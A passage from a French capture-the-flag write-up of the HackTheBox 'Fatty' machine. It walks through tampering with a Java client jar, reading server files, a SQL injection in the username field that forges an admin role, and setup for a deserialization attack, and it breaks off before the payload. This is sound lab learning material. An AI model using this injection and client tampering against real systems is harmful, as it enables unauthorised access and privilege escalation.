    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>La première chose à faire c&rsquo;est d&rsquo;essayer d&rsquo;executer le client normalement. Pour cela, rien de plus simple !</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java -jar fatty-client.jar</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src='/img/fatty_client_login.png' alt="Page de login du client jar"></p>
<p>On arrive sur une page de login, on test les identifiants donnés dans la 3ème note ( qtc / clarabibi ) et&hellip; Ça ne fonctionne pas. On obient un <em>Connection Error !</em></p>
<h2 class="heading-element" id="réussir-à-se-connecter"><span>Réussir à se connecter</span>
  <a href="#r%c3%a9ussir-%c3%a0-se-connecter" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Si on se réfère à la première note : le port du serveur à changé, il est passé de 8000 à 1337 (et 1338, 1339 sans doute pour éviter les problèmes s&rsquo;il y a trop de joueurs à la fois). Il faut donc trouver un moyen d&rsquo;arranger tout ça.</p>
<p>On a besoin d&rsquo;un peu plus d&rsquo;informations. On va donc regarder dans le jar.</p>
<p>Basiquement, les jar ne sont que des archives de projet java.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file fatty-client.jar
</span></span><span class="line"><span class="cl">	fatty-client.jar: Zip archive data, at least v2.0 to extract</span></span></code></pre></td></tr></table>
</div>
</div><p>Donc on va juste decompresser l&rsquo;archive et regarder son contenu.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir jar_content
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> jar_content
</span></span><span class="line"><span class="cl">unzip ../fatty-client.jar</span></span></code></pre></td></tr></table>
</div>
</div><p>On y trouve un fichier <strong>beans.xml</strong>, celui-ci sera utilisé par Spring pour la construction d&rsquo;objets. Ce fichier contient dans notre cas les informations de connexion au serveur :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;connectionContext&#34;</span> <span class="na">class =</span> <span class="s">&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span> <span class="na">value =</span> <span class="s">&#34;server.fatty.htb&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span> <span class="na">value =</span> <span class="s">&#34;8000&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/bean&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Je vais donc tout simplement les modifier pour qu&rsquo;ils collent au serveur auquel je veux me connecter.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;connectionContext&#34;</span> <span class="na">class =</span> <span class="s">&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span> <span class="na">value =</span> <span class="s">&#34;10.10.10.174&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span> <span class="na">value =</span> <span class="s">&#34;1337&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/bean&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Ensuite, je n&rsquo;ai plus qu&rsquo;à recréer l&rsquo;archive et à l&rsquo;executer</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip -r ../modified-client.jar *
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
</span></span><span class="line"><span class="cl">java -jar modifier-client.jar</span></span></code></pre></td></tr></table>
</div>
</div><p>On retente la connexion avec les identifiants trouvés plus tôt et&hellip; On obtient une erreur.</p>
<blockquote>
<p>Exception in thread &ldquo;AWT-EventQueue-0&rdquo; org.springframework.beans.factory.BeanDefinitionStoreException: Unexpected exception parsing XML document from class path resource [beans.xml]; nested exception is java.lang.SecurityException: SHA-256 digest error for beans.xml</p></blockquote>
<p>En réalité, ce n&rsquo;est pas très grave. Le jar vérifie juste son intégrité via les signatures de fichiers et puisqu&rsquo;on a modifié <strong>beans.xml</strong>, sa signature a changé. On va donc supprimer les fichiers permettant cette vérification.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip -d modified-client.jar <span class="s1">&#39;META-INF/*.SF&#39;</span> <span class="s1">&#39;META-INF/*.RSA&#39;</span> <span class="s1">&#39;META-INF/*SF&#39;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>On relance le jar, et cette fois la connexion fonctionne \o/</p>
<h2 class="heading-element" id="obtenir-le-code-du-serveur"><span>Obtenir le code du serveur</span>
  <a href="#obtenir-le-code-du-serveur" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Une fois connecté au serveur via le client, on a plusieurs fonctionnalités qui s&rsquo;offrent à nous :</p>
<ul>
<li><em>Whoami</em> - Pour avoir notre login et notre role (dans notre cas <strong>qtc</strong> et <strong>user</strong>)</li>
<li><em>Connection Test</em> - Pour tester la connexion avec le serveur</li>
<li><em>File Browser</em> - Pour sélectionner un dossier et pouvoir ensuite lire les fichiers qu&rsquo;il contient</li>
</ul>
<p>Ainsi que des fonctionnalités &ldquo;grisées&rdquo;, sans doute accessible uniquement aux admins :</p>
<ul>
<li><em>ChangePassword</em></li>
<li><em>Uname</em></li>
<li><em>Users</em></li>
<li><em>Netstat</em></li>
<li><em>IpConfig</em></li>
</ul>
<p>Pour commencer, on essaie de lire un fichier du serveur. On sait qu&rsquo;il s&rsquo;agit d&rsquo;un Linux, on va donc tenter un <em>Path Traversal</em> via le <em>File Browser</em> pour lire le fichier <em>/etc/passwd</em>.</p>
<p><img loading="lazy" src='/img/fatty_traversal_fail.png' alt="Path Traversal fail"></p>
<p>Visiblement, ça ne fonctionne pas, des caractères sont supprimés&hellip; Même en essayant de &ldquo;bypass&rdquo; ce nettoyage, impossible d&rsquo;effectuer un <em>Path Traversal</em>.</p>
<p>Il faudrait avoir accès au code du client afin de comprendre comment il fonctionne. Et un outil existe pour décompiler du java : <strong>jd-gui</strong> !</p>
<p>On va tout simplement utiliser jd-gui pour récupérer l&rsquo;intégralité des fichiers sources du projet. Pour cela on ouvre le projet (le modifié afin de toujours avoir le beans.xml voulu).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jd-gui modified-client.jar</span></span></code></pre></td></tr></table>
</div>
</div><p>Puis on sauvegarde les sources (<em>File &gt; Save All Sources</em>).</p>
<p>On obtient alors un magnifique zip que l&rsquo;on va décompresser.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir client_sources
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> client_sources
</span></span><span class="line"><span class="cl">unzip ../modified-client_sources.zip</span></span></code></pre></td></tr></table>
</div>
</div><p>Le dossier <em>org</em> contient apparemment des librairies importées. On va donc se concentrer sur le dossier <em>htb/fatty</em> qui a l&rsquo;air de contenir du code propre à notre client. On va donc dans ce dossier et on recherche les fonctions qui nous intéressent.</p>
<p>Dans notre cas on veut voir comment le <em>File Browser</em> fonctionne, on va donc faire une recherche par rapport à certains mots clefs. Par exemple le mot clef <strong>configs</strong> qui correspond à l&rsquo;un des dossiers que l&rsquo;on peut explorer.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -lR configs
</span></span><span class="line"><span class="cl">	client/gui/ClientGuiTest.java</span></span></code></pre></td></tr></table>
</div>
</div><p>On fouille un peu le code java et on retrouve très vite la partie qui nous intéresse : Comment est configuré le dossier avec le <em>File Browser</em>.</p>
<p><img loading="lazy" src='/img/fatty_filebrowser_code.png' alt="Code configuration dossier configs dans le File Browser"></p>
<p>Sachant que toutes les options de <em>File Browser</em> nous emmènent dans <em>/opt/fatty/files/&lt;OPTION CHOISIE&gt;</em> on va essayer de modifier les strings <em>configs</em> de cette fonction pas <em>..</em> voir si on peut accéder à <em>/opt/fatty</em>.</p>
<p>On retourne dans la racine des sources (ici <em>client_sources</em>) et on compile tout ça.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ../..
</span></span><span class="line"><span class="cl"><span class="nb">shopt</span> -s globstar <span class="c1">#Pour faciliter la compilation juste après</span>
</span></span><span class="line"><span class="cl">javac **/*.java</span></span></code></pre></td></tr></table>
</div>
</div><p>Ici on a une erreur avec la compilation de spring ! Il suffit de récupérer le contenu déjà compilé que l&rsquo;on a décompressé tout à l&rsquo;heure.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm -rf org/
</span></span><span class="line"><span class="cl">cp -r ../jar_content/org/ .
</span></span><span class="line"><span class="cl">javac **/*.java
</span></span><span class="line"><span class="cl">zip -r ../modified-client.jar *</span></span></code></pre></td></tr></table>
</div>
</div><p>On relance le client, se connecte et va dans <em>File Browser &gt; Configs</em> et là&hellip; Le contenu affiché diffère de la dernière fois.</p>
<p><img loading="lazy" src='/img/fatty_opt_fatty_content.png' alt="Contenu /opt/fatty"></p>
<p>Visiblement <em>logs</em>, <em>tar</em> et <em>files</em> sont des dossiers. On va alors lire <em>start.sh</em>.</p>
<p><img loading="lazy" src='/img/fatty_start_sh_content.png' alt="Contenu start.sh"></p>
<p>Apparemment, nous sommes dans un docker. On va malgré tout continuer et essayer de récupérer <em>fatty-server.jar</em>.</p>
<p>On se frotte à un problème : Le client ne nous permet que d&rsquo;afficher les fichiers&hellip; Il faut donc trouver un moyen de télécharger ce fichier. En réfléchissant, j&rsquo;ai décider d&rsquo;utiliser une méthode &ldquo;sale&rdquo; mais efficace : écrire le retour du <em>Open</em> directement dans un fichier.</p>
<p>Il faut donc modifier le code (encore).</p>
<p>Donc là encore il faut trouver le moment de reception du contenu des fichiers lus. On va se baser sur le <em>Open</em> dans le GUI. On trouve le nom <em>openFileButton</em> auquel est accroché une action et pour obtenir la réponse cette action fait <strong>this.invoker.open()</strong>.</p>
<p>Malheureusement, cela nous sort un String, je veux être sur de ne pas avoir de problème, je veux le byte-string correspondant. On va remonter cette fonction <em>open</em>.</p>
<p>Pour ça, on voit que invoker vient d&rsquo;un autre fichier java : <strong>htb/fatty/client/methods/Invoker.java</strong> et on retrouve le code de la fonction <em>open</em>.</p>
<p><img loading="lazy" src='/img/fatty_open_code.png' alt="Code de la fonction open"></p>
<p>On voit bien le moment où il récupère le contenu de la réponse. Ici il fait un <strong>getContentAsString()</strong>. On va plutôt utiliser la méthode <strong>getContent()</strong> qui va récupérer un objet de type <strong>byte[]</strong> et le rediriger vers un fichier.</p>
<p><img loading="lazy" src='/img/fatty_modified_open.png' alt="Code modifié de open"></p>
<p>On a donc rajouté les lignes suivantes</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;/tmp/fatty-server.jar&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">fos</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">response</span><span class="p">.</span><span class="na">getContent</span><span class="p">());</span><span class="w">			
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>En oubliant pas d&rsquo;importer les bibliothèques java nécessaires</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Donc à chaque fois que l&rsquo;on va utiliser <em>open</em>, le contenu de la réponse sera écrit dans ce fichier.</p>
<p>On recompile, recréé le jar et on va utiliser la fonction <em>open</em> sur <em>fatty-server.jar</em>. Puis on regarde si le fichier a bien été créé.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file /tmp/fatty-server.jar
</span></span><span class="line"><span class="cl">	/tmp/fatty-server.jar: Zip archive data, at least v1.0 to extract</span></span></code></pre></td></tr></table>
</div>
</div><p>Super ! On a plus qu&rsquo;à le récupérer et surtout&hellip; Récupérer ses sources, là encore avec <strong>jd-gui</strong>.</p>
<p>Maintenant la question est&hellip; Qu&rsquo;est-ce qu&rsquo;on en fait ?</p>
<p>On a vu qu&rsquo;il y avait des options &ldquo;grisée&rdquo;, on en a déduit qu&rsquo;elles n&rsquo;étaient pas accessible au role <em>user</em>. On va donc essayer d&rsquo;obtenir un role <em>admin</em>. On part donc en analyse statique du code du serveur.</p>
<h2 class="heading-element" id="obtenir-plus-de-droits"><span>Obtenir plus de droits</span>
  <a href="#obtenir-plus-de-droits" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>En regardant rapidement le code du serveur, on voit qu&rsquo;il y a un code pour gérer la base de données (<em>htb/fatty/server/databaseF/attyDbSession.java</em>) et dans ce code se trouve une requête SQL.</p>
<p><img loading="lazy" src='/img/fatty_server_logging.png' alt="Code de connexion utilisateur sur le serveur"></p>
<p>Et surtout, fait intéressant, la requête est vulnérable aux injections ! Et elle récupère 5 données que l&rsquo;on peut facilement comprendre :</p>
<ul>
<li>id : l&rsquo;ID de l&rsquo;utilisateur (sans doute une clef primaire de la table)</li>
<li>username : le nom de l&rsquo;utilisateur (jusque là on utilisait <em>qtc</em>)</li>
<li>email : le mail de l&rsquo;utilisateur</li>
<li>password : le mot de passe de l&rsquo;utilisateur (jusque là <em>clarabibi</em>)</li>
<li>role : le rôle de l&rsquo;utilisateur (jusque là <em>user</em>)</li>
</ul>
<p>Il faut donc forger une requête avec le même username, le même hash de mot de passe mais un rôle <strong>admin</strong>.</p>
<p>On peut voir que pour la vérification du mot de passe, celle-ci se fait en vérifiant le mot de passe de l&rsquo;utilisateur requêté et celui qui a été envoyé pas le client. On va donc faire une modification dans le client pour envoyer un &ldquo;hash&rdquo; connu.</p>
<p>Et pour ça, ça se passe dans <em>htb/fatty/shared/resources/User.java</em> avec la fonction <em>setPassword()</em></p>
<p><img loading="lazy" src='/img/fatty_setPassword.png' alt="Code setPassword() du client"></p>
<p>On va tout simplement modifier la dernière ligne de ce code par :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="na">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ABCD&#34;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>On compile, recréé le jar et pour se connecter on met en guise de username :</p>
<blockquote>
<p>pouet&rsquo; UNION SELECT 1, &lsquo;qtc&rsquo;, &lsquo;<a href="mailto:qtc@mail.com"target="_blank" rel="external nofollow noopener noreferrer">qtc@mail.com</a>&rsquo;, &lsquo;ABCD&rsquo;, &lsquo;admin</p></blockquote>
<p>Et nous avons une connexion en tant que qtc avec un rôle admin !</p>
<h2 class="heading-element" id="obtenir-un-accès-sur-le-serveur"><span>Obtenir un accès sur le serveur</span>
  <a href="#obtenir-un-acc%c3%a8s-sur-le-serveur" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>On a donc maintenant accès à des commandes &ldquo;admin&rdquo;. Il y a sans doute faire quelque chose à faire avec.</p>
<p>Dans la liste on a :</p>
<ul>
<li><em>Uname</em> - Effectue un <em>uname</em> sur le serveur</li>
<li><em>Users</em>  - Liste apparemment le contenu de <em>/home</em></li>
<li><em>Netstat</em> - Effectue un netstat</li>
<li><em>IpConfig</em> - Effectue un ipconfig</li>
<li><em>ChangePassword</em> - Permet de changer le mot de passe, mais n&rsquo;est pas implémenté encore</li>
</ul>
<p>Après vérification dans le code serveur,  on peut vori qu&rsquo;on a tout bon pour les 4 premiers et il n&rsquo;y a aucune injection de commande possible. L&rsquo;idée est donc de se concentrer sur le <em>ChangePassword</em> qui pour le coup est un peu plus particulier.</p>
<p>On regarde donc le code au niveau du serveur.</p>
<p><img loading="lazy" src='/img/fatty_changePW.png' alt="Code ChangePassword sur le serveur"></p>
<p>Et on voit une désérialisation vers un object <em>User</em>. On cherche un peu d&rsquo;information sur les désérialisation en java et on tombe vite sur le github <a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet"target="_blank" rel="external nofollow noopener noreferrer">Java Deserialization Cheat Sheet</a>. Et il parle de <strong>CommonsCollections</strong>, une bibliothèque Java qui est justement utilisée pas notre client et notre serveur.</p>
<p>On regarde un peu plus en détail notre code et on voit que cet objet sérialisé vient d&rsquo;un Base64 qui a été envoyé par le client. On va donc voir au niveau du code client, dans le fichier <em>htb/fatty/client/methods/Invoker.java</em> (Fonction <em>changePW()</em> là aussi).</p>
<p><img loading="lazy" src='/img/fatty_serialized_user.png' alt="Envoi de l’objet sérialisé dans le code client"></p>
<p>Dans un premier temps, on va faire en sorte qu&rsquo;il soit &ldquo;implémenté&rdquo; (C&rsquo;est à dire que cette fonction soit appelée). Pour ça, ça se passe dans le code du GUI, ligne 560.</p>
<p><img loading="lazy" src='/img/fatty_pwChangeButton.png' alt="Listener du bouton de changement de mot de passe"></p>
<p>On voit que lorsque l&rsquo;on appuie sur le bouton, le message &ldquo;<em>Not implemented yet.</em>&rdquo; est affiché dans tous les cas. On va supprimer l&rsquo;affichage de ce message et copier le fonctionnement des autre boutons pour appeler <em>changePW()</em>. On va donc mettre ce code (avec des valeurs &ldquo;poubelles&rdquo; dans l&rsquo;appel de la fonction puisqu&rsquo;on ne s&rsquo;en servira pas).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ClientGuiTest</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">invoker</span><span class="p">.</span><span class="na">changePW</span><span class="p">(</span><span class="s">&#34;qtc&#34;</span><span class="p">,</span><span class="s">&#34;pouetpouet&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">MessageBuildException</span><span class="o">|</span><span class="n">htb</span><span class="p">.</span><span class="na">fatty</span><span class="p">.</span><span class="na">shared</span><span class="p">.</span><span class="na">message</span><span class="p">.</span><span class="na">MessageParseException</span><span class="w"> </span><span class="n">e1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">JOptionPane</span><span class="p">.</span><span class="na">showMessageDialog</span><span class="p">(</span><span class="n">controlPanel</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Failure during message building/parsing.&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Error&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">JOptionPane</span><span class="p">.</span><span class="na">showMessageDialog</span><span class="p">(</span><span class="n">controlPanel</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Error&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">textPane</span><span class="p">.</span><span class="na">setText</span><span class="p">(</span><span class="s">&#34;Payload launched&#34;</span><span class="p">);</span><span class="w"> </span><span class="o">/*</span><span class="w"> </span><span class="n">Pour</span><span class="w"> </span><span class="n">être</span><span class="w"> </span><span class="n">sûr</span><span class="w"> </span><span class="n">que</span><span class="w"> </span><span class="n">ça</span><span class="w"> </span><span class="n">appelle</span><span class="w"> </span><span class="n">la</span><span class="w"> </span><span class="n">fonction</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Et maintenant, on modifie le code de <em>changePW()</em>. Dans un premier temps il nous faut une payload.</p>
